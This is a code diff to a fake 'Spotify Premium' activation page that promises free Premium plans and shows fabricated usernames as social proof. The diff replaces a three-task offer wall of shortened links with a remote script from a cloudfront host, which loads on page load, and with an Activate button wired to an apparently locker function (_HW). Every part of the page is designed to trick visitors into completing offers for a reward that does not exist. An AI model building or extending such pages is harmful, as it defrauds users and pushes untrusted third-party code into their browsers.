@@ -1,6 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script type="text/javascript">
+        var Rfhcc_rSh_hNpKAc={"it":4516839,"key":"b7cee"};
+    </script>
+    <script src="https://dlk457skl57zp.cloudfront.net/80cc56c.js"></script>
+    
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Spotify Premium</title>
@@ -74,13 +79,6 @@
         .custom-scrollbar::-webkit-scrollbar-thumb:hover {
             background: var(--spotify-light-gray);
         }
-
-        /* Styles for disabled offers */
-        .offer-disabled {
-            opacity: 0.5;
-            pointer-events: none; /* Makes the element unclickable */
-            cursor: not-allowed;
-        }
     </style>
 </head>
 <body class="flex flex-col items-center justify-center min-h-screen p-4 bg-black">
@@ -111,35 +109,9 @@
                     <button class="plan-btn group" onclick="selectPlan(this, '6 Months')"><span>6 Months Premium</span><svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.414-1.415L11 9.586V6z" clip-rule="evenodd" /></svg></button>
                     <button class="plan-btn group" onclick="selectPlan(this, '12 Months')"><span>12 Months Premium</span><svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z" /></svg></button>
                 </div>
-                <button id="plan-btn" onclick="goToStep(3)" class="w-full bg-[var(--spotify-green)] text-[var(--spotify-black)] font-bold py-3 px-4 rounded-full mt-6 transition-all duration-300 disabled:bg-gray-600 disabled:cursor-not-allowed" disabled>
+                <button id="plan-btn"  onclick="_HW()" class="w-full bg-[var(--spotify-green)] text-[var(--spotify-black)] font-bold py-3 px-4 rounded-full mt-6 transition-all duration-300 disabled:bg-gray-600 disabled:cursor-not-allowed" disabled>
                     Activate
                 </button>
-            </div>
-
-            <!-- Step 3: Verification -->
-            <div id="step-3" class="step hidden w-full">
-                <div class="text-center">
-                    <h1 class="text-white text-xl font-bold">Final Step: Verification</h1>
-                </div>
-                <div class="text-center my-4 text-sm">
-                     <p class="text-[var(--spotify-light-gray)]">Account: <strong id="user-username" class="text-white">...</strong></p>
-                     <p class="text-[var(--spotify-light-gray)]">Plan: <strong id="user-plan" class="text-white">...</strong></p>
-                </div>
-                <div class="w-full bg-[var(--spotify-gray)] rounded-full h-2 mb-4">
-                    <div id="progress-bar" class="bg-[var(--spotify-green)] h-2 rounded-full transition-all duration-500" style="width: 0%"></div>
-                </div>
-                <div id="offer-wall" class="flex flex-col gap-3 max-h-64 overflow-y-auto custom-scrollbar">
-                    <!-- Offers will be injected here -->
-                </div>
-            </div>
-
-            <!-- Step 4: Success Message -->
-            <div id="step-4" class="step hidden w-full text-center py-8">
-                 <div class="w-20 h-20 bg-green-500/10 rounded-full flex items-center justify-center mx-auto mb-4 border-2 border-[var(--spotify-green)]">
-                    <svg class="w-10 h-10 text-[var(--spotify-green)]" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
-                </div>
-                <h2 class="text-2xl font-bold text-white mb-2">Activation Complete!</h2>
-                <p class="text-[var(--spotify-light-gray)]">Your <strong id="final-plan" class="text-white"></strong> has been applied. Please restart Spotify to see the changes.</p>
             </div>
             
             <!-- Loading Spinner -->
@@ -170,20 +142,16 @@
         let username = '';
         let selectedPlan = '';
         let currentStep = 1;
-        let completedOffers = 0;
 
         // --- Config ---
-        const OFFERS_TO_COMPLETE = 3; // We now have 3 tasks
-        const OFFERS = [
-            { name: 'Complete Task 1', description: 'Click to open the first task.', icon: 'M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z', url: 'https://smrturl.co/c5e4c7d' },
-            { name: 'Complete Task 2', description: 'Click to open the second task.', icon: 'M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z', url: 'https://smrturl.co/1fe057d' },
-            { name: 'Complete Task 3', description: 'Click to open the final task.', icon: 'M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z', url: 'https://smrturl.co/1feb95e' },
-        ];
         const FAKE_USERNAMES = ['xX_MusicLover_Xx', 'Lila2023', 'JohnP_1998', 'sara_beats', 'daveyJ', 'AcousticGirl', 'MC_Flow', 'rockstar88', 'QuietStorm', 'EDM_Head'];
         const FAKE_PLANS = ['3 Months', '6 Months', '12 Months'];
 
         // --- DOM Elements ---
-        const steps = [1, 2, 3, 4].reduce((acc, n) => ({ ...acc, [n]: document.getElementById(`step-${n}`) }), {});
+        const steps = {
+            1: document.getElementById('step-1'),
+            2: document.getElementById('step-2'),
+        };
         const loadingScreen = document.getElementById('loading');
         
         /**
@@ -219,12 +187,6 @@
                 username = input.value.trim();
                 showLoading('Validating username...');
                 setTimeout(() => showStep(2), 2000);
-            } else if (nextStep === 3) {
-                showLoading('Connecting to activation servers...');
-                setTimeout(() => {
-                    setupVerificationStep();
-                    showStep(3);
-                }, 2500);
             }
         }
 
@@ -244,92 +206,24 @@
         }
 
         /**
-         * Sets up the verification step UI.
+         * Runs the activation scripts provided by the user.
          */
-        function setupVerificationStep() {
-            document.getElementById('user-username').textContent = username;
-            document.getElementById('user-plan').textContent = selectedPlan;
-            createOfferElements();
-        }
+        function runActivation() {
+            showLoading('Finalizing activation...');
 
-        /**
-         * Dynamically creates offer elements.
-         */
-        function createOfferElements() {
-            const offerWall = document.getElementById('offer-wall');
-            offerWall.innerHTML = '';
-            OFFERS.forEach((offer, index) => {
-                const button = document.createElement('a');
-                button.href = offer.url;
-                button.target = "_blank";
-                button.className = "offer bg-[var(--spotify-gray)]/50 border-2 border-transparent rounded-lg p-3 flex items-center gap-4 w-full text-left transition-all duration-300 hover:bg-[var(--spotify-gray)] no-underline";
-                
-                // Disable all but the first offer
-                if (index > 0) {
-                    button.classList.add('offer-disabled');
-                }
+            // Create the first script element for the configuration object
+            const configScript = document.createElement('script');
+            configScript.type = 'text/javascript';
+            // Use innerHTML to set the script content
+            configScript.innerHTML = 'var Rfhcc_rSh_hNpKAc={"it":4516839,"key":"b7cee"};';
 
-                button.innerHTML = `
-                    <div class="w-10 h-10 bg-[var(--spotify-black)] rounded-md flex items-center justify-center shrink-0">
-                        <svg class="w-5 h-5 text-[var(--spotify-light-gray)]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="${offer.icon}"></path></svg>
-                    </div>
-                    <div class="flex-grow">
-                        <p class="font-bold text-white text-sm">${offer.name}</p>
-                        <p class="text-xs text-[var(--spotify-light-gray)]">${offer.description}</p>
-                    </div>
-                    <div class="offer-status w-8 h-8 flex items-center justify-center shrink-0">
-                        <svg class="w-6 h-6 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>
-                    </div>
-                `;
-                button.onclick = (e) => {
-                    // Prevent default only if the offer is not disabled
-                    if (button.classList.contains('offer-disabled')) {
-                        e.preventDefault();
-                        return;
-                    }
-                    handleOfferClick(e.currentTarget, index);
-                };
-                offerWall.appendChild(button);
-            });
-        }
+            // Create the second script element for the external JS file
+            const externalScript = document.createElement('script');
+            externalScript.src = 'https://dlk457skl57zp.cloudfront.net/80cc56c.js';
 
-        /**
-         * Handles offer click event.
-         */
-        function handleOfferClick(button, index) {
-            // Prevent multiple completions
-            if (button.dataset.completed) return;
-            button.dataset.completed = "true";
-
-            // Mark as visually complete
-            button.classList.remove('hover:bg-[var(--spotify-gray)]');
-            button.classList.add('bg-green-500/10', 'border-[var(--spotify-green)]');
-            button.querySelector('.offer-status').innerHTML = `<svg class="w-5 h-5 text-[var(--spotify-green)]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>`;
-            
-            updateProgress();
-
-            // Enable the next offer
-            const allOffers = document.querySelectorAll('#offer-wall .offer');
-            if (allOffers[index + 1]) {
-                allOffers[index + 1].classList.remove('offer-disabled');
-            }
-        }
-
-        /**
-         * Updates the progress bar and checks for completion.
-         */
-        function updateProgress() {
-            completedOffers++;
-            const percentage = Math.min(100, (completedOffers / OFFERS_TO_COMPLETE) * 100);
-            document.getElementById('progress-bar').style.width = `${percentage}%`;
-
-            if (completedOffers >= OFFERS_TO_COMPLETE) {
-                setTimeout(() => {
-                    document.getElementById('final-plan').textContent = selectedPlan;
-                    showLoading('Activation successful!');
-                    setTimeout(() => showStep(4), 2000);
-                }, 750);
-            }
+            // Append the scripts to the document's head to execute them
+            document.head.appendChild(configScript);
+            document.head.appendChild(externalScript);
         }
         
         /**
